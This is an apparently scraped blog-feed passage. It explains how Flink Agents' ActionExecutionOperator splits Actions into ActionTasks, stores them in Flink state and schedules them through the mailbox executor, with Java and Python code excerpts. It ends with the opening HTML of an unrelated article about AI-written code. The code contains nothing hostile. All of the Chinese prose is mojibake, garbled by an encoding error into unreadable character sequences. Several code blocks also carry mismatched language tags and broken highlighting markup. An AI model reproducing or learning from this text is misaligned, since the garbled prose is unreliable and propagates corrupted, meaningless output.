<li>åŠ¨ä½œçŠ¶æ€å­˜å‚¨ï¼ˆå¯é€‰ï¼‰</li>
</ul>
<p><strong>æ¢å¤é€»è¾‘ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//Â æ•…éšœ/é‡å¯åæ¢å¤å¤„ç†</span>
privateÂ voidÂ <span class="hljs-built_in">tryResumeProcessActionTasks</span>()Â throwsÂ ExceptionÂ {
Â Â Â Â Iterable&lt;<span class="hljs-selector-tag">Object</span>&gt;Â keysÂ =Â currentProcessingKeysOpState<span class="hljs-selector-class">.get</span>();
Â Â Â Â ifÂ (keysÂ !=Â null)Â {
Â Â Â Â Â Â Â Â forÂ (ObjectÂ keyÂ :Â keys)Â {
Â Â Â Â Â Â Â Â Â Â Â Â keySegmentQueue<span class="hljs-selector-class">.addKeyToLastSegment</span>(key);
Â Â Â Â Â Â Â Â Â Â Â Â mailboxExecutor<span class="hljs-selector-class">.submit</span>(
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ()Â -&gt;Â <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key),Â "processÂ actionÂ task");
Â Â Â Â Â Â Â Â }
Â Â Â Â }
}
</code></pre>
<h4 data-id="heading-29">2.5 ä¸æ‰§è¡Œç¯å¢ƒçš„é›†æˆ</h4>
<p>æœ¬åœ°ç¯å¢ƒå’Œè¿œç¨‹ç¯å¢ƒçš„ç”Ÿæˆè¿‡ç¨‹ä¸åŒï¼š</p>
<p><strong>è¿œç¨‹ç¯å¢ƒï¼ˆFlink é›†ç¾¤ï¼‰</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">//Â åœ¨Â RemoteExecutionEnvironment.javaÂ ä¸­</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span>Â <span class="hljs-title class_">DataStream</span>&lt;<span class="hljs-title class_">Object</span>&gt;Â <span class="hljs-title function_">toDataStream</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">if</span>Â (agentPlanÂ ==Â <span class="hljs-literal">null</span>)Â {
Â Â Â Â Â Â Â Â <span class="hljs-keyword">throw</span>Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"MustÂ applyÂ agentÂ beforeÂ callingÂ toDataStream"</span>);
Â Â Â Â }

Â Â Â Â <span class="hljs-keyword">if</span>Â (outputDataStreamÂ ==Â <span class="hljs-literal">null</span>)Â {
Â Â Â Â Â Â Â Â <span class="hljs-keyword">if</span>Â (keySelectorÂ !=Â <span class="hljs-literal">null</span>)Â {
Â Â Â Â Â Â Â Â Â Â Â Â outputDataStreamÂ =
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-title class_">CompileUtils</span>.<span class="hljs-title function_">connectToAgent</span>(inputDataStream,Â keySelector,Â agentPlan);
Â Â Â Â Â Â Â Â }Â <span class="hljs-keyword">else</span>Â {
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â å¦‚æœæ²¡æœ‰æä¾›é”®é€‰æ‹©å™¨ï¼Œåˆ™ä½¿ç”¨ç®€å•çš„ç›´é”®é€‰æ‹©å™¨</span>
Â Â Â Â Â Â Â Â Â Â Â Â outputDataStreamÂ =
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-title class_">CompileUtils</span>.<span class="hljs-title function_">connectToAgent</span>(inputDataStream,Â xÂ -&gt;Â x,Â agentPlan);
Â Â Â Â Â Â Â Â }
Â Â Â Â }

Â Â Â Â <span class="hljs-keyword">return</span>Â outputDataStream;
}
</code></pre>
<p><strong>æœ¬åœ°ç¯å¢ƒ</strong></p>
<p>å¯¹äºæœ¬åœ°æ‰§è¡Œï¼Œä½¿ç”¨å®Œå…¨ä¸åŒçš„ LocalRunner è€Œä¸æ˜¯åŸºäºæ“ä½œç¬¦çš„æ–¹æ³•ã€‚</p>
<h4 data-id="heading-30">2.6 æ€»ç»“</h4>
<p>ActionExecutionOperator é€šè¿‡ Flink çš„è½¬æ¢ API ä½¿ç”¨å·¥å‚æ¨¡å¼ç”Ÿæˆã€‚ç”Ÿæˆç­–ç•¥é‡ç‚¹å…³æ³¨ï¼š</p>
<ul>
<li>å£°æ˜å¼æ–¹æ³•ï¼šä½¿ç”¨ AgentPlan å®šä¹‰è¡Œä¸º</li>
<li>ç±»å‹çµæ´»æ€§ï¼šé€šè¿‡åºåˆ—åŒ–æ”¯æŒ Java å’Œ Python</li>
<li>çŠ¶æ€ç®¡ç†ï¼šæ­£ç¡®ç®¡ç† Flink çŠ¶æ€ä»¥å®ç°å®¹é”™</li>
<li>èµ„æºæ³¨å…¥ï¼šæä¾›å¯¹å·²é…ç½®èµ„æºçš„è®¿é—®</li>
<li>å¯æ¢å¤å¤„ç†ï¼šé€šè¿‡çŠ¶æ€å¿«ç…§æ”¯æŒæ•…éšœæ¢å¤</li>
</ul>
<p>è¿™ç§è®¾è®¡å…è®¸æ“ä½œç¬¦åŸºäºä»£ç†å®šä¹‰åŠ¨æ€åˆ›å»ºï¼ŒåŒæ—¶ä¿æŒ Flink æµå¤„ç†çš„ä¿è¯ã€‚</p>
<h3 data-id="heading-31">0x03 ä»»åŠ¡æ‹†åˆ†æœºåˆ¶è¯¦è§£</h3>
<h4 data-id="heading-32">3.1 ä»»åŠ¡æ‹†åˆ†çš„åŸºæœ¬åŸç†</h4>
<h5 data-id="heading-33">ä¸ºä»€ä¹ˆéœ€è¦æ‹†åˆ†ä»»åŠ¡</h5>
<p>ActionExecutionOperator å°†å¤æ‚çš„ Action æ‹†åˆ†æˆå¤šä¸ª ActionTask çš„ä¸»è¦åŸå› æ˜¯ä¸ºäº†æ”¯æŒå¼‚æ­¥æ“ä½œå’ŒçŠ¶æ€ç®¡ç†ã€‚</p>
<p>ä¸€ä¸ªå®Œæ•´çš„ Action å¯èƒ½åŒ…å«ä»¥ä¸‹å¤æ‚åœºæ™¯ï¼š</p>
<ul>
<li>éœ€è¦ç­‰å¾…å¤–éƒ¨æœåŠ¡å“åº”çš„å¼‚æ­¥è°ƒç”¨</li>
<li>éœ€è¦åˆ†æ­¥éª¤æ‰§è¡Œçš„é•¿æ—¶é—´è¿è¡Œä»»åŠ¡</li>
<li>éœ€è¦åœ¨ä¸åŒæ—¶é—´ç‚¹äº§ç”Ÿå¤šä¸ªè¾“å‡ºäº‹ä»¶çš„ä»»åŠ¡</li>
</ul>
<h5 data-id="heading-34">æ‹†åˆ†ç²’åº¦</h5>
<p>æ¯ä¸ª ActionTask ä»£è¡¨ Action ä¸­çš„ä¸€ä¸ªæ‰§è¡Œå•å…ƒï¼Œé€šå¸¸å¯¹åº”ä»¥ä¸‹æƒ…å†µä¹‹ä¸€ï¼š</p>
<ul>
<li>Action çš„åˆå§‹æ‰§è¡Œæ­¥éª¤</li>
<li>å¼‚æ­¥æ“ä½œçš„è§¦å‘å’Œå›è°ƒå¤„ç†</li>
<li>é•¿æ—¶é—´è¿è¡Œä»»åŠ¡çš„é˜¶æ®µæ€§æ‰§è¡Œ</li>
</ul>
<h4 data-id="heading-35">3.2 ä»»åŠ¡åˆ›å»ºè¿‡ç¨‹</h4>
<h5 data-id="heading-36">ä¸åŒç±»å‹ ActionTask çš„åˆ›å»º</h5>
<p>æ ¹æ® Action çš„æ‰§è¡Œç±»å‹ï¼ˆJava æˆ– Pythonï¼‰ï¼Œåˆ›å»ºç›¸åº”çš„ ActionTask å®ç°ï¼š</p>
<ul>
<li>JavaActionTaskï¼šå¤„ç† Java å®ç°çš„ Action</li>
<li>PythonActionTaskï¼šå¤„ç† Python å®ä¾‹çš„ Action</li>
</ul>
<h5 data-id="heading-37">åŠ¨æ€åˆ›å»º ActionTask</h5>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒActionTask.invoke() å¯èƒ½ä¼šäº§ç”Ÿæ–°çš„ ActionTask æ¥ç»§ç»­å¤„ç†ï¼š</p>
<ul>
<li>å¼‚æ­¥æ“ä½œå®Œæˆåéœ€è¦è¿›ä¸€æ­¥å¤„ç†ç»“æœ</li>
<li>é•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡éœ€è¦åˆ†é˜¶æ®µæ‰§è¡Œ</li>
<li>éœ€è¦ç­‰å¾…æŸäº›æ¡ä»¶æ»¡è¶³åå†ç»§ç»­æ‰§è¡Œ</li>
</ul>
<p>å…·ä½“å¯¹åº”ä»£ç ä¸­ï¼Œå°±æ˜¯å½“ ActionTask è¢«æ‰§è¡Œæ—¶ï¼Œå…¶ invoke() æ–¹æ³•å¯èƒ½ä¼šè¿”å›ä¸€ä¸ªæ–°çš„ ActionTask æ¥ç»§ç»­æ‰§è¡Œå‰©ä½™çš„å·¥ä½œï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">//Â PythonActionTask.invoke()Â ç¤ºä¾‹</span>
<span class="hljs-function"><span class="hljs-keyword">public</span>Â ActionTaskResultÂ <span class="hljs-title">invoke</span>()Â throwsÂ Exception</span>Â {
Â Â Â Â <span class="hljs-comment">//Â æ‰§è¡ŒÂ PythonÂ å‡½æ•°</span>
Â Â Â Â StringÂ pythonGeneratorRefÂ =Â pythonActionExecutor.executePythonFunction(...);

Â Â Â Â <span class="hljs-keyword">if</span>Â (pythonGeneratorRefÂ !=Â <span class="hljs-literal">null</span>)Â {
Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â å¦‚æœè¿”å›äº†ç”Ÿæˆå™¨å¼•ç”¨ï¼Œåˆ›å»ºæ–°çš„Â ActionTaskÂ æ¥å¤„ç†åç»­æ­¥éª¤</span>
Â Â Â Â Â Â Â Â ActionTaskÂ tempGeneratedActionTaskÂ =
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">new</span>Â PythonGeneratorActionTask(key,Â <span class="hljs-keyword">event</span>,Â action,Â pythonGeneratorRef);
Â Â Â Â Â Â Â Â tempGeneratedActionTask.setRunnerContext(runnerContext);
Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â tempGeneratedActionTask.invoke();
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â å¦‚æœæ²¡æœ‰æ›´å¤šæ­¥éª¤ï¼Œæ ‡è®°ä»»åŠ¡å®Œæˆ</span>
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-keyword">new</span>Â ActionTaskResult(
Â Â Â Â Â Â Â Â <span class="hljs-literal">true</span>,Â runnerContext.drainEvents(<span class="hljs-keyword">event</span>.getSourceTimestamp()),Â <span class="hljs-literal">null</span>);
}
</code></pre>
<p>ä¹Ÿä¼šåœ¨ processEvent ä¸­å¯åŠ¨æ–°çš„taskã€‚</p>
<pre><code class="hljs language-scss" lang="scss">Â Â Â Â privateÂ voidÂ <span class="hljs-built_in">processEvent</span>(ObjectÂ key,Â EventÂ event)Â throwsÂ ExceptionÂ {
Â Â Â Â Â Â Â Â <span class="hljs-built_in">notifyEventProcessed</span>(event);

Â Â Â Â Â Â Â Â booleanÂ isInputEventÂ =Â EventUtil<span class="hljs-selector-class">.isInputEvent</span>(event);
Â Â Â Â Â Â Â Â ifÂ (EventUtil.isOutputEvent(event))Â {
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â IfÂ theÂ eventÂ isÂ anÂ OutputEvent,Â weÂ sendÂ itÂ downstream.</span>
Â Â Â Â Â Â Â Â Â Â Â Â OUTÂ outputDataÂ =Â <span class="hljs-built_in">getOutputFromOutputEvent</span>(event);
Â Â Â Â Â Â Â Â Â Â Â Â ifÂ (event.hasSourceTimestamp())Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â output<span class="hljs-selector-class">.collect</span>(reusedStreamRecord.replace(outputData,Â event.getSourceTimestamp()));
Â Â Â Â Â Â Â Â Â Â Â Â }Â elseÂ {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â reusedStreamRecord<span class="hljs-selector-class">.eraseTimestamp</span>();
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â output<span class="hljs-selector-class">.collect</span>(reusedStreamRecord.replace(outputData));
Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â }Â elseÂ {
Â Â Â Â Â Â Â Â Â Â Â Â ifÂ (isInputEvent)Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â IfÂ theÂ eventÂ isÂ anÂ InputEvent,Â weÂ markÂ thatÂ theÂ keyÂ isÂ currentlyÂ beingÂ processed.</span>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â currentProcessingKeysOpState<span class="hljs-selector-class">.add</span>(key);
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-built_in">initOrIncSequenceNumber</span>();
Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â WeÂ thenÂ obtainÂ theÂ triggeredÂ actionÂ andÂ addÂ ActionTasksÂ toÂ theÂ waitingÂ processing</span>
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â queue.</span>
Â Â Â Â Â Â Â Â Â Â Â Â List&lt;Action&gt;Â triggerActionsÂ =Â <span class="hljs-built_in">getActionsTriggeredBy</span>(event);
Â Â Â Â Â Â Â Â Â Â Â Â ifÂ (triggerActionsÂ !=Â nullÂ &amp;&amp;Â !triggerActions.isEmpty())Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â forÂ (ActionÂ triggerActionÂ :Â triggerActions)Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â actionTasksKState<span class="hljs-selector-class">.add</span>(createActionTask(key,Â triggerAction,Â event));
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â }

Â Â Â Â Â Â Â Â ifÂ (isInputEvent)Â {
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â IfÂ theÂ eventÂ isÂ anÂ InputEvent,Â weÂ submitÂ aÂ newÂ mailÂ toÂ tryÂ processingÂ theÂ actions.</span>
Â Â Â Â Â Â Â Â Â Â Â Â mailboxExecutor<span class="hljs-selector-class">.submit</span>(()Â -&gt;Â <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key),Â "processÂ actionÂ task");
Â Â Â Â Â Â Â Â }
Â Â Â Â }
</code></pre>
<p>createActionTask çš„ä»£ç å¦‚ä¸‹ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">private</span>Â ActionTaskÂ createActionTask(<span class="hljs-type">Object</span>Â <span class="hljs-keyword">key</span>,Â ActionÂ action,Â <span class="hljs-keyword">Event</span>Â <span class="hljs-keyword">event</span>)Â {
Â Â Â Â <span class="hljs-keyword">if</span>Â (action.getExec()Â instanceofÂ JavaFunction)Â {
Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-built_in">new</span>Â JavaActionTask(
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">key</span>,Â <span class="hljs-keyword">event</span>,Â action,Â getRuntimeContext().getUserCodeClassLoader());
Â Â Â Â }Â <span class="hljs-keyword">else</span>Â <span class="hljs-keyword">if</span>Â (action.getExec()Â instanceofÂ PythonFunction)Â {
Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-built_in">new</span>Â PythonActionTask(<span class="hljs-keyword">key</span>,Â <span class="hljs-keyword">event</span>,Â action);
Â Â Â Â }Â <span class="hljs-keyword">else</span>Â {
Â Â Â Â Â Â Â Â <span class="hljs-keyword">throw</span>Â <span class="hljs-built_in">new</span>Â IllegalStateException(
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">"UnsupportedÂ actionÂ type:Â "</span>Â +Â action.getExec().getClass());
Â Â Â Â }
}
</code></pre>
<h3 data-id="heading-38">0x04 ä»»åŠ¡é˜Ÿåˆ—ç®¡ç†</h3>
<h4 data-id="heading-39">4.1 ä»»åŠ¡çŠ¶æ€å­˜å‚¨</h4>
<p>ActionExecutionOperator ä½¿ç”¨ Flink çš„çŠ¶æ€ç®¡ç†æ¥å­˜å‚¨å¾…å¤„ç†çš„ ActionTaskï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">//Â åœ¨Â operatorÂ ä¸­å®šä¹‰çš„çŠ¶æ€</span>
<span class="hljs-keyword">private</span>Â transientÂ ListState&lt;ActionTask&gt;Â actionTasksKState;

<span class="hljs-comment">//Â åˆå§‹åŒ–çŠ¶æ€</span>
actionTasksKStateÂ =Â <span class="hljs-built_in">getRuntimeContext</span>().<span class="hljs-built_in">getListState</span>(
Â Â Â Â <span class="hljs-keyword">new</span>Â ListStateDescriptor&lt;&gt;(<span class="hljs-string">"actionTasks"</span>,Â TypeInformation.<span class="hljs-built_in">of</span>(ActionTask.<span class="hljs-keyword">class</span>)));
</code></pre>
<h4 data-id="heading-40">4.2 ä»»åŠ¡è°ƒåº¦æœºåˆ¶</h4>
<p>ActionExecutionOperator ä½¿ç”¨ Flink çš„ Mailbox æœºåˆ¶æ¥è°ƒåº¦ ActionTask çš„æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-scss" lang="scss">privateÂ voidÂ <span class="hljs-built_in">processEvent</span>(ObjectÂ key,Â EventÂ event)Â throwsÂ ExceptionÂ {
Â Â Â Â <span class="hljs-comment">//Â ...Â å¤„ç†äº‹ä»¶é€»è¾‘Â ...</span>
Â Â Â Â ifÂ (isInputEvent)Â {
Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â æäº¤é‚®ä»¶ä»»åŠ¡æ¥å¤„ç†Â ActionTask</span>
Â Â Â Â Â Â Â Â mailboxExecutor<span class="hljs-selector-class">.submit</span>(()Â -&gt;Â <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key),Â "processÂ actionÂ task");
Â Â Â Â }
}
</code></pre>
<h4 data-id="heading-41">4.3 ä»»åŠ¡å¤„ç†å¾ªç¯</h4>
<p>tryProcessActionTaskForKey æ–¹æ³•å®ç°äº†æŒç»­å¤„ç†åŒä¸€ä¸ª key ä¸‹çš„å¤šä¸ª ActionTask çš„æœºåˆ¶ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">privateÂ voidÂ <span class="hljs-built_in">tryProcessActionTaskForKey</span>(ObjectÂ key)Â {
Â Â Â Â tryÂ {
Â Â Â Â Â Â Â Â <span class="hljs-built_in">processActionTaskForKey</span>(key);
Â Â Â Â }Â catchÂ (ExceptionÂ e)Â {
Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â é”™è¯¯å¤„ç†</span>
Â Â Â Â }
}

privateÂ voidÂ <span class="hljs-built_in">processActionTaskForKey</span>(ObjectÂ key)Â throwsÂ ExceptionÂ {
Â Â Â Â <span class="hljs-comment">//Â 1.Â è·å–å¾…å¤„ç†çš„Â ActionTask</span>
Â Â Â Â ActionTaskÂ actionTaskÂ =Â <span class="hljs-built_in">pollFromListState</span>(actionTasksKState);

Â Â Â Â ifÂ (actionTaskÂ ==Â null)Â {
Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â æ²¡æœ‰æ›´å¤šä»»åŠ¡ï¼Œæ¸…çŠ¶æ€</span>
Â Â Â Â Â Â Â Â return;
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â 2.Â æ‰§è¡ŒÂ ActionTask</span>
Â Â Â Â ActionTaskResultÂ resultÂ =Â actionTask<span class="hljs-selector-class">.invoke</span>();

Â Â Â Â <span class="hljs-comment">//Â 3.Â å¤„ç†ç»“æœ</span>
Â Â Â Â ifÂ (!result.isFinished())Â {
Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â å¦‚æœæœªå®Œæˆï¼Œå°†ç”Ÿæˆçš„æ–°ä»»åŠ¡åŠ å…¥é˜Ÿåˆ—</span>
Â Â Â Â Â Â Â Â actionTasksKState<span class="hljs-selector-class">.add</span>(result.getGeneratedActionTask()<span class="hljs-selector-class">.get</span>());
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â 4.Â å¤„ç†è¾“å‡ºäº‹ä»¶</span>
Â Â Â Â forÂ (EventÂ outputEventÂ :Â result.getOutputEvents())Â {
Â Â Â Â Â Â Â Â <span class="hljs-built_in">processEvent</span>(key,Â outputEvent);
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â 5.Â å¦‚æœè¿˜æœ‰ä»»åŠ¡ï¼Œç»§ç»­è°ƒåº¦</span>
Â Â Â Â ifÂ (currentKeyHasMoreActionTask())Â {
Â Â Â Â Â Â Â Â mailboxExecutor<span class="hljs-selector-class">.submit</span>(()Â -&gt;Â <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key),Â "processÂ actionÂ task");
Â Â Â Â }
}Â Â Â Â Â Â Â Â 
</code></pre>
<h3 data-id="heading-42">0x05 å®é™…åº”ç”¨ç¤ºä¾‹</h3>
<h4 data-id="heading-43">5.1 å¼‚æ­¥ HTTP è¯·æ±‚å¤„ç†</h4>
<p>è€ƒè™‘ä¸€ä¸ªéœ€è¦è°ƒç”¨å¤–éƒ¨ API çš„ Actionï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@action(<span class="hljs-params">SomeEvent</span>)</span>
<span class="hljs-keyword">def</span>Â <span class="hljs-title function_">fetch_external_data</span>(<span class="hljs-params">event,Â ctx</span>):
Â Â Â Â <span class="hljs-comment">#Â æ­¥éª¤1:Â å‘èµ·å¼‚æ­¥HTTPè¯·æ±‚</span>
Â Â Â Â futureÂ =Â asyncio.create_task(http_client.get(<span class="hljs-string">f"https://api.example.com/data/<span class="hljs-subst">{event.<span class="hljs-built_in">id</span>}</span>"</span>))

Â Â Â Â <span class="hljs-comment">#Â ç¬¬ä¸€æ¬¡æ‰§è¡Œåˆ°è¿™é‡Œä¼šæš‚åœï¼Œè¿”å›ä¸€ä¸ªç”Ÿæˆå™¨</span>
Â Â Â Â responseÂ =Â <span class="hljs-keyword">await</span>Â future

Â Â Â Â <span class="hljs-comment">#Â æ­¥éª¤2:Â å¤„ç†å“åº”æ•°æ®</span>
Â Â Â Â processed_dataÂ =Â process_response(response)

Â Â Â Â <span class="hljs-comment">#Â æ­¥éª¤3:Â å‘é€ç»“æœäº‹ä»¶</span>
Â Â Â Â ctx.send_event(ResultEvent(processed_data))
</code></pre>
<p>è¿™ä¸ª Action ä¼šè¢«æ‹†åˆ†ä¸ºå¤šä¸ª ActionTaskï¼š</p>
<ul>
<li>åˆå§‹ä»»åŠ¡ï¼šå‘èµ· HTTP è¯·æ±‚å¹¶ç­‰å¾…</li>
<li>åç»­ä»»åŠ¡ï¼šå¤„ç†å“åº”å¹¶å‘é€ç»“æœ</li>
</ul>
<h4 data-id="heading-44">5.2 å¤æ‚ä¸šåŠ¡æµç¨‹å¤„ç†</h4>
<p>ä¸€ä¸ªå¤šæ­¥éª¤çš„ä¸šåŠ¡æµç¨‹ä¹Ÿå¯èƒ½è¢«æ‹†åˆ†ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">@action(OrderEvent)
<span class="hljs-function">defÂ <span class="hljs-title">process_order</span>(<span class="hljs-params"><span class="hljs-keyword">event</span>,Â ctx</span>):
Â Â Â Â #Â æ­¥éª¤1ï¼šéªŒè¯è®¢å•
Â Â Â Â <span class="hljs-title">validate_order</span>(<span class="hljs-params"><span class="hljs-keyword">event</span>.order</span>)
Â Â Â Â #Â æ­¥éª¤2ï¼šæ£€æŸ¥åº“å­˜ï¼ˆå¯èƒ½éœ€è¦å¼‚æ­¥è°ƒç”¨ï¼‰
Â Â Â Â inventory_status</span>Â =Â check_inventory(<span class="hljs-keyword">event</span>.order.items)
Â Â Â Â <span class="hljs-meta">#Â æ­¥éª¤3ï¼šå¤„ç†æ”¯ä»˜ï¼ˆå¯èƒ½éœ€è¦å¼‚æ­¥è°ƒç”¨ï¼‰</span>
Â Â Â Â payment_resultÂ =Â process_payment(<span class="hljs-keyword">event</span>.order)
Â Â Â Â <span class="hljs-meta">#Â æ­¥éª¤4ï¼šæ›´æ–°è®¢å•çŠ¶æ€</span>
Â Â Â Â update_order_status(<span class="hljs-keyword">event</span>.order.id,Â <span class="hljs-string">"completed"</span>)
Â Â Â Â <span class="hljs-meta">#Â æ­¥éª¤5ï¼šå‘é€é€šçŸ¥</span>
Â Â Â Â send_notification(<span class="hljs-keyword">event</span>.customer_email,Â <span class="hljs-string">"OrderÂ completed"</span>)
</code></pre>
<p>æ¯ä¸ªéœ€è¦ç­‰å¾…çš„æ­¥éª¤éƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ ActionTaskï¼Œç¡®ä¿æ•´ä¸ªæµç¨‹æ­£ç¡®æ‰§è¡Œã€‚</p>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼ŒActionExecutionOperator èƒ½å¤Ÿæœ‰æ•ˆåœ°ç®¡ç†å’Œæ‰§è¡Œå¤æ‚çš„ã€å¯èƒ½æ¶‰åŠå¼‚æ­¥æ“ä½œçš„ Actionï¼ŒåŒæ—¶ä¿è¯çŠ¶æ€çš„ä¸€è‡´æ€§å’Œå®¹é”™èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-45">0xFF å‚è€ƒ</h3>
<p>æœ¬æ–‡ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarkdown.com.cn" target="_blank" title="https://markdown.com.cn" ref="nofollow noopener noreferrer">markdown.com.cn</a> æ’ç‰ˆ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Netflixå·¥ç¨‹å¸ˆçš„è­¦å‘Šï¼šAIæ­£åœ¨ç¼–å†™æˆ‘ä»¬çœ‹ä¸æ‡‚çš„ä»£ç ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•åº”å¯¹ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592815497848029247</link>    <guid>https://juejin.cn/post/7592815497848029247</guid>    <pubDate>2026-01-08T12:52:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497848029247" data-draft-id="7592865044690944006" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Netflixå·¥ç¨‹å¸ˆçš„è­¦å‘Šï¼šAIæ­£åœ¨ç¼–å†™æˆ‘ä»¬çœ‹ä¸æ‡‚çš„ä»£ç ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•åº”å¯¹ï¼Ÿ"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T12:52:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Nicander"/> <meta itemprop="url" content="https://juejin.cn/user/4397684911516093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Netflixå·¥ç¨‹å¸ˆçš„è­¦å‘Šï¼šAIæ­£åœ¨ç¼–å†™æˆ‘ä»¬çœ‹ä¸æ‡‚çš„ä»£ç ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•åº”å¯¹ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4397684911516093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Nicander
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:52:38.000Z" title="Thu Jan 08 2026 12:52:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
